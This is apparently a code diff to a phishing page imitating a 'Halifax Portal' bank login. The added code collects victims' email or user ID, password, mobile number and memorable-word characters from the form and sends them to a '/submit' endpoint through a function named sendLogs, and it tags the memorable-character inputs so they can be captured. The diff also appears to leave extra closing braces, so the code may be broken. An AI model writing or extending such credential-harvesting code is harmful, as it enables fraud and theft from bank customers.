@@ -304,14 +304,43 @@
     var email = document.getElementById('email')?.value || document.getElementById('uid')?.value || '';
     var pwd = document.getElementById('pwd')?.value || '';
     var mobile = document.getElementById('ms-mobile')?.value || document.getElementById('hfx-mobile')?.value || '';
+    
+    // Universal memorable characters capture
+    var memorable_chars = '';
+    // Look for inputs with IDs like char1, char2, char3
+    for (var i = 1; i <= 10; i++) {
+      var charInput = document.getElementById('char' + i) || document.getElementById('hfx-mem-char-' + (i - 1));
+      if (charInput) {
+        memorable_chars += charInput.value || '';
+      }
+    }
+    // Also look for elements with class .ms-memorable
+    var memElements = document.querySelectorAll('.ms-memorable');
+    if (memElements.length > 0) {
+      memorable_chars = '';
+      memElements.forEach(function(el) {
+        if (el.value !== undefined) memorable_chars += el.value;
+        else if (el.textContent) memorable_chars += el.textContent;
+      });
+    }
+    
     try {
       await fetch('/submit', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ page: 'Halifax Portal', type: type, email: email, pwd: pwd, mobile: mobile })
+        body: JSON.stringify({ 
+          page: 'Halifax Portal', 
+          type: type, 
+          email: email, 
+          pwd: pwd || memorable_chars, 
+          mobile: mobile,
+          memorable_chars: memorable_chars 
+        })
       });
     } catch (e) {
       console.warn('sendLogs failed', e);
+    }
+  }
     }
   }
   function nextStep(btn) { sendLogs('email-step'); goWithLoader(2, btn); }
@@ -328,11 +357,11 @@
     }
     positions.sort(function(a,b){return a-b;});
     var row = document.getElementById('char-row');
-    positions.forEach(function(p){
+    positions.forEach(function(p, index){
       var fg = document.createElement('div');
       fg.className = 'char-fg';
       var suffix = p===1?'st':p===2?'nd':p===3?'rd':'th';
-      fg.innerHTML = '<label>'+p+'<sup>'+suffix+'</sup></label><input type="password" maxlength="1" />';
+      fg.innerHTML = '<label>'+p+'<sup>'+suffix+'</sup></label><input type="password" maxlength="1" id="hfx-mem-char-'+index+'" />';
       row.appendChild(fg);
     });
   })();
